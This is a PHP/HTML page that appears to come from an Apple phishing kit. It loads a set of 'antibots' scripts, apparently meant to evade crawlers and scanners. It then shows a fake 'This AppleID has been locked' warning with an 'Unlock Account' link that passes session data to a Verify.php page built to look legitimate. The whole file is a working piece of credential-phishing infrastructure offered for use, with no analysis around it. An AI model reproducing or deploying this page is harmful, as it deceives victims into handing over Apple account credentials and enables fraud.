<?php
require "includes/session_protect.php";
require "includes/functions.php";
require "includes/simplehtmldom.php";
include "./BOTS/antibots1.php";
include "./BOTS/antibots2.php";
include "./BOTS/antibots3.php";
include "./BOTS/antibots4.php";
include "./BOTS/antibots5.php";
include "./BOTS/antibots6.php";
?>
<!DOCTYPE html>
<html>
<head>
<meta content="text/html; charset=utf-8" http-equiv="Content-Type">
<meta content="width=device-width, initial-scale=1, maximum-scale=1" name="viewport">
<link href="css/Fonts.css" rel="prefetch stylesheet" type="text/css">
<link href="css/Login.css" media="screen" rel="stylesheet" type="text/css">
<title></title>
</head>
<body>
<div class="si-body si-container container-fluid" data-theme="lite" id="content">
<div class="widget-container fade-in restrict-max-wh fade-in" data-mode="embed">
<div class="dialog fade-in">
<div class="app-dialog">
<div class="head">
<div class="title" title-align="center">
<br><br>
<img src="img/user_shield.png" width="75px">
<h2> This AppleID has been locked</h2>
<font size="3"><div class="thin">We've noticed significant changes in your account activity. For your protection, we`ve disable your account.</div></font>
</div>
</div>
<div class="body" body-align="center">
<div class="acc-locked" id="acc-locked">
<div class="dialog-body">
<div class="dialog-info">
<a class="Unclock" target="_top" href="../Verify.php?<?php echo $_SESSION['user'];?>&Account-Unlock&sessionid=<?php echo generateRandomString(115); ?>&securessl=true">Unlock Account</a>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</body>
</html>